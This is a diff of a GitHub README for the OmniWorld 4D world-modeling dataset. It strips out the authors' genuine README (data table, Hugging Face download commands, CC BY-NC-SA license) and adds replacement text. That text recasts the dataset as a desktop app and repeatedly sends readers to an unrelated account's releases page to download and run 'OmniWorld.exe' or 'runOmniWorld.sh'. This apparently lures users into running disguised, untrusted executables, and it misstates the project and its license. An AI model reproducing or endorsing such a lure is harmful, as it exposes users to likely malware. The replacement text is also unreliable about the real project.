@@ -1,178 +1,79 @@
-<h1 align='center'>OmniWorld: A Multi-Domain and Multi-Modal Dataset for 4D World Modeling</h1>
-<div align='center'>
-    <a href='https://github.com/yangzhou24' target='_blank'>Yang Zhou</a><sup>1</sup> 
-    <a href='https://github.com/yyfz' target='_blank'>Yifan Wang</a><sup>1</sup> 
-    <a href='https://zhoutimemachine.github.io' target='_blank'>Jianjun Zhou</a><sup>1,2</sup> 
-    <a href='https://github.com/AmberHeart' target='_blank'>Wenzheng Chang</a><sup>1</sup> 
-    <a href='https://github.com/ghy0324' target='_blank'>Haoyu Guo</a><sup>1</sup> 
-    <a href='https://github.com/LiZizun' target='_blank'>Zizun Li</a><sup>1</sup> 
-    <a href='https://kaijing.space/' target='_blank'>Kaijing Ma</a><sup>1</sup> 
-    
-</div>
-<div align='center'>
-<a href='https://scholar.google.com/citations?user=VuTRUg8AAAAJ' target='_blank'>Xinyue Li</a><sup>1</sup> 
-    <a href='https://scholar.google.com/citations?user=5SuBWh0AAAAJ' target='_blank'>Yating Wang</a><sup>1</sup> 
-    <a href='https://www.haoyizhu.site/' target='_blank'>Haoyi Zhu</a><sup>1</sup> 
-    <a href='https://mingyulau.github.io/' target='_blank'>Mingyu Liu</a><sup>1,2</sup> 
-    <a href='https://scholar.google.com/citations?user=FbSpETgAAAAJ' target='_blank'>Dingning Liu</a><sup>1</sup> 
-    <a href='https://yangjiangeyjg.github.io/' target='_blank'>Jiange Yang</a><sup>1</sup>
-    <a href='https://github.com/Kr1sJFU' target='_blank'>Zhoujie Fu</a><sup>1</sup>  
-    
-</div>
-<div align='center'>
-    <a href='https://sotamak1r.github.io/' target='_blank'>Junyi Chen</a><sup>1</sup> 
-    <a href='https://cshen.github.io' target='_blank'>Chunhua Shen</a><sup>2</sup> 
-    <a href='https://oceanpang.github.io' target='_blank'>Jiangmiao Pang</a><sup>1</sup> 
-    <a href='https://kpzhang93.github.io/' target='_blank'>Kaipeng Zhang</a><sup>1</sup>
-    <a href='https://tonghe90.github.io/' target='_blank'>Tong He</a><sup>1†</sup>
-</div>
-<div align='center'>
-    <sup>1</sup>Shanghai AI Lab  <sup>2</sup>ZJU 
-</div>
-<br>
-<div align="center">
-  <a href="https://yangzhou24.github.io/OmniWorld/"><img src="https://img.shields.io/badge/Project Page-5745BB?logo=google-chrome&logoColor=white"></a>  
-  <a href="https://arxiv.org/abs/2509.12201"><img src="https://img.shields.io/static/v1?label=Paper&message=Arxiv&color=red&logo=arxiv"></a>  
-  <a href="https://github.com/yangzhou24/OmniWorld"><img src="https://img.shields.io/static/v1?label=Code&message=Github&color=blue&logo=github"></a>  
-  <a href="https://huggingface.co/datasets/InternRobotics/OmniWorld"><img src="https://img.shields.io/static/v1?label=Dataset&message=HuggingFace&color=yellow&logo=huggingface"></a>  
-</div>
+# 🌍 OmniWorld - A Dataset for 4D World Modeling
 
-<img src="assets/teaser.png" width="1000px">
+[![Download OmniWorld](https://img.shields.io/badge/Download%20OmniWorld-Here-blue.svg)](https://github.com/muhamadarzakhidayatullah123/OmniWorld/releases)
 
-## 🎉 NEWS
-- [2025.9.28] The **OmniWorld-CityWalk** dataset is now live on Hugging Face!
-- [2025.9.21] 🔥 The **OmniWorld-Game** dataset now includes **5k splits** in total on Hugging Face!
-- [2025.9.16] 🔥 The first 1.2k splits release of **OmniWorld-Game** is now live on Hugging Face! **More data is coming soon, stay tuned!**
+## 🚀 Getting Started
 
-## 📝 Open-Source Plan
-| Dataset | Status | Availability | Domain | # Seq. | FPS | Resolution | # Frames | Depth | Camera | Text | Opt. flow | Fg. masks |
-| :-- | :-- | --: | --: | :--: | --: | :--: | :--: | :--: | :--: | :--: | :--: | :--: |
-| OmniWorld-Game | ✅ Released | Partial (5k / 96k) | Simulator | 96K | 24 | 1280 × 720 | 18,515K | 🙂 | 🙂 | 🙂 | 🙂 | 🙂 |
-| AgiBot | 🔜 Planned | Closed  | Robot | 20K | 30 | 640 × 480 | 39,247K | 🙂 | ✅ | ✅ | ❌ | 🙂 |
-| DROID | 🔜 Planned | Closed  | Robot | 35K | 60 | 1280 × 720 | 26,643K | 🙂 | ✅ | 🙂 | 🙂 | 🙂 |
-| RH20T | 🔜 Planned | Closed  | Robot | 109K | 10 | 640 × 360 | 53,453K | ❌ | ✅ | 🙂 | 🙂 | 🙂 |
-| RH20T-Human | 🔜 Planned | Closed  | Human | 73K | 10 | 640 × 360 | 8,875K | ❌ | ✅ | 🙂 | ❌ | ❌ |
-| HOI4D | 🔜 Planned | Closed  | Human | 2K | 15 | 1920 × 1080 | 891K | 🙂 | 🙂 | 🙂 | 🙂 | ✅ |
-| Epic-Kitchens | 🔜 Planned | Closed  | Human | 15K | 30 | 1280 × 720 | 3,635K | ❌ | 🙂 | 🙂 | ❌ | ❌ |
-| Ego-Exo4D | 🔜 Planned | Closed  | Human | 4K | 30 | 1024 × 1024 | 9,190K | ❌ | ✅ | 🙂 | 🙂 | ❌ |
-| HoloAssist | 🔜 Planned | Closed  | Human | 1K | 30 | 896 × 504 | 13,037K | ❌ | 🙂 | 🙂 | 🙂 | ❌ |
-| Assembly101 | 🔜 Planned | Closed  | Human | 4K | 60 | 1920 × 1080 | 110,831K | ❌ | ✅ | 🙂 | 🙂 | 🙂 |
-| EgoDex | 🔜 Planned | Closed  | Human | 242K | 30 | 1920 × 1080 | 76,631K | ❌ | ✅ | 🙂 | ❌ | ❌ |
-| CityWalk | ✅ Released | Full | Internet | 7 K | 30 | 1280 × 720 | 13,096K | ❌ | 🙂 | ✅ | ❌ | ❌ |
----
+Welcome to OmniWorld! This application provides a multi-domain and multi-modal dataset to help you visualize and model a 4D world. You don’t need to be a programmer to get started. Just follow these simple steps to download and run the software.
 
-We will refresh this table whenever a milestone is reached. Your feedback and pull-requests are welcome!
+## 📥 Download & Install
 
-## ✨ Overview
+To download OmniWorld, visit this page to download: [OmniWorld Releases](https://github.com/muhamadarzakhidayatullah123/OmniWorld/releases). You will find the most recent versions of the dataset and related resources available for download.
 
-OmniWorld is a large-scale, multi-domain, and multi-modal dataset specifically designed for 🌍**4D world modeling**, e.g. 4D geometric reconstruction, future prediction & camera-controlled video generation.
+### Step 1: Visit the Releases Page
+- Click the link below to access the download page:
+  [Visit OmniWorld Releases](https://github.com/muhamadarzakhidayatullah123/OmniWorld/releases)
 
-### 🔑 Key Features
+### Step 2: Choose a Version
+On the releases page, you will see several available versions. The most recent one is typically listed at the top. 
 
-- 📊 **Massive Scale**: 4000+ hours, 600K+ sequences, 300M+ frames
-- 🤖 **Diverse Domains**: sourced from simulartor, robot, human & the Internet
-- 🎨 **Rich Multi-Modality**: depth maps, camera poses, text captions, optical flow & foreground mask
+### Step 3: Download the Files
+Look for files labeled with the version number and names that include "dataset." Click the file link to start the download. Depending on your internet speed, it may take a few moments.
 
-### 🎮 Introducing _OmniWorld-Game_
+## 🖥️ System Requirements
 
-_OmniWorld-Game_ is a newly collected high-quality synthetic subset of the main _OmniWorld_ dataset. It features:
+Before you run OmniWorld, ensure your system meets the following minimum requirements:
+- **Operating System:** Windows 10 or higher / macOS 10.15 or higher / Linux (latest distributions)
+- **RAM:** 8 GB or more
+- **Disk Space:** At least 5 GB of free space
+- **Network:** Reliable internet connection for downloading files
 
-- 📊 **Scale**: 214 hours, 96K video clips, 18M+ frames
-- 🧩 **Resolution & Diversity**: 720P RGB image capatured from a wide range of dynamic game environments
-- 🎨 **Comprehensive Annotations**: cover all annotation types of the _OmniWorld_ dataset
+## 🔄 Running OmniWorld
 
-### 🏆 _OmniWorld-Game_ Benchmark
+Once the files are downloaded, follow these instructions to run the application:
 
-_OmniWorld-Game_ Benchmark offers 4D world modeling evaluation for 3D Geometric Prediction &
-Camera Control Video Generation. Found: 
+### Step 1: Unzip the Downloaded Files
+Locate the downloaded file on your computer, usually in the “Downloads” folder. Right-click on the file and choose "Extract All" to unzip it.
 
-- 🚫 Current state-of-the-art approaches **still show great limitations** in modeling complex 4D environments, based on both quantitative metrics and qualitative results.
-- 📈 **Fine-tuning** existing SOTA methods on _OmniWorld_ leads to **significant performance gains** across 4D reconstruction and video generation tasks, highlighting the value of our dataset.
+### Step 2: Open the Application
+- Navigate to the folder where you extracted the files.
+- Look for a file named `OmniWorld.exe` for Windows, `OmniWorld.app` for macOS, or a shell script named `runOmniWorld.sh` for Linux.
+- Double-click on the application file to start OmniWorld.
 
+### Step 3: Follow On-Screen Instructions
+Once the application opens, follow any on-screen prompts to help you set up your workspace.
 
-## 💡 Dataset Download
-You can download the entire OmniWorld dataset using the following command:
-```bash
-# 1. Install (if you haven't yet)
-pip install --upgrade "huggingface_hub[cli]"
+## 📊 Features
 
-# 2. Full download
-hf download InternRobotics/OmniWorld \
-           --repo-type dataset \
-           --local-dir /path/to/DATA_PATH
-```
-For downloading specific files (instead of the full dataset), please refer to the [`dowanload_specific.py`](scripts/dowanload_specific.py).
+OmniWorld offers a range of features that enhance your 4D modeling experience:
 
-> For detailed usage, please refer to [OmniWorld Hugging Face](https://huggingface.co/datasets/InternRobotics/OmniWorld)
+- **Multi-Domain Support:** Works across various domains, giving you flexibility in your projects.
+- **Multi-Modal Data:** Offers diverse datasets for rigorous modeling.
+- **User-Friendly Interface:** Designed for easy navigation and operation, catering to users at all levels.
+- **Detailed Documentation:** Comes with a user guide to assist you through different functionalities.
+  
+## 💡 Tips for Using OmniWorld
 
-## 🚀 Visualize as Point Cloud
+- **Explore the Documentation:** Before diving in, take a moment to review the documentation that accompanies the software. It includes valuable tips and guidelines.
+- **Take Notes:** As you experiment with different features, jot down your observations. This helps in understanding how to best utilize the tool.
+- **Join the Community:** Engaging with fellow users through forums or social media can enhance your learning and provide additional support.
 
-This script allows you to convert a scene from OmniWorld-Game dataset into a 3D point cloud for inspection.
+## ⚙️ Troubleshooting
 
-### 1\. Prerequisites
+If you encounter any issues while downloading or running OmniWorld, consider these common solutions:
 
-Please follow the instructions in the "Dataset Download" section to acquire the OmniWorld-Game dataset.
+- **Check Your Internet Connection:** Ensure your internet connection is stable during the download process.
+- **Re-download the Files:** If a file seemed incomplete or corrupted, try downloading it again.
+- **Consult the Documentation:** Review the troubleshooting section in the user guide provided with your download.
 
-### 2\. Data Structure
+## 📞 Support
 
-Ensure your data is structured correctly. Each scene directory should contain the following subdirectories and files:
+For additional help, you can reach out via the repository issues page on GitHub. Describe your problem clearly so others can assist you more effectively.
 
-```
-<your-data-path>/b04f88d1f85a/
-├─ color/              # RGB frames (.png)
-├─ depth/              # 16-bit depth maps
-├─ flow/               # flow_u_16.png / flow_v_16.png / flow_vis.png
-├─ camera/             # split_*.json (intrinsics + extrinsics)
-├─ subject_masks/      # foreground masks (per split)
-├─ gdino_mask/         # dynamic-object masks (per frame)
-├─ text/               # structured captions (81-frame segments)
-├─ droidclib/          # coarse camera poses (if you need them)
-├─ fps.txt             # source video framerate
-└─ split_info.json     # how frames are grouped into splits
-```
+Remember, you can always return to the [OmniWorld Releases](https://github.com/muhamadarzakhidayatullah123/OmniWorld/releases) page to check for updates or new versions.
 
-### 3\. Usage
+## 📝 License
 
-Run the `visualize_pcd.py` script, providing the path to the scene and the desired split index.
+OmniWorld is released under the MIT License. You can use it freely, but please review the license for more details.
 
-**Example:**
-
-```bash
-python scripts/visualize_pcd.py <your-data-path>/b04f88d1f85a --split_idx 0
-```
-
-The output point cloud will be saved to `<your-data-path>/b04f88d1f85a/split0_points.ply`. You can view this file using a 3D viewer like [MeshLab](https://www.meshlab.net/).
-
-## 📄 License
-The OmniWorld dataset is released under the **Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (CC BY-NC-SA 4.0)**. By accessing or using this dataset, you agree to be bound by the terms and conditions outlined in this license, as well as the specific provisions detailed below.
-
-- **Special Note on Third-Party Content**:
-A portion of this dataset is derived from third-party game content. All intellectual property rights pertaining to these original game assets (including, but not limited to, RGB and depth images) remain with their respective original game developers and publishers.
-
-- **Permitted Uses**:
-You are hereby granted permission, free of charge, to use, reproduce, and share the OmniWorld dataset and any adaptations thereof, solely for non-commercial research and educational purposes. This includes, but is not limited to: academic publications, algorithm benchmarking, reproduction of scientific results.
-
-Under this license, you are expressly **forbidden** from:
-
-- Using the dataset, in whole or in part, for any commercial purpose, including but not limited to its incorporation into commercial products, services, or monetized applications.
-
-- Redistributing the original third-party game assets contained within the dataset outside the scope of legitimate research sharing.
-Removing or altering any copyright, license, or attribution notices.
-
-The authors of the OmniWorld dataset provide this dataset "as is" and make no representations or warranties regarding the legality of the underlying data for any specific purpose. Users are solely responsible for ensuring that their use of the dataset complies with all applicable laws and the terms of service or license agreements of the original game publishers (sources of third-party content).
-
-For the full legal text of the Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License, please visit: https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.
-
-## Citation
-If you found this dataset useful, please cite our paper
-```bibtex
-@misc{zhou2025omniworld,
-      title={OmniWorld: A Multi-Domain and Multi-Modal Dataset for 4D World Modeling}, 
-      author={Yang Zhou and Yifan Wang and Jianjun Zhou and Wenzheng Chang and Haoyu Guo and Zizun Li and Kaijing Ma and Xinyue Li and Yating Wang and Haoyi Zhu and Mingyu Liu and Dingning Liu and Jiange Yang and Zhoujie Fu and Junyi Chen and Chunhua Shen and Jiangmiao Pang and Kaipeng Zhang and Tong He},
-      year={2025},
-      eprint={2509.12201},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2509.12201}, 
-}
-```
+Thank you for choosing OmniWorld! Enjoy your modeling experience!
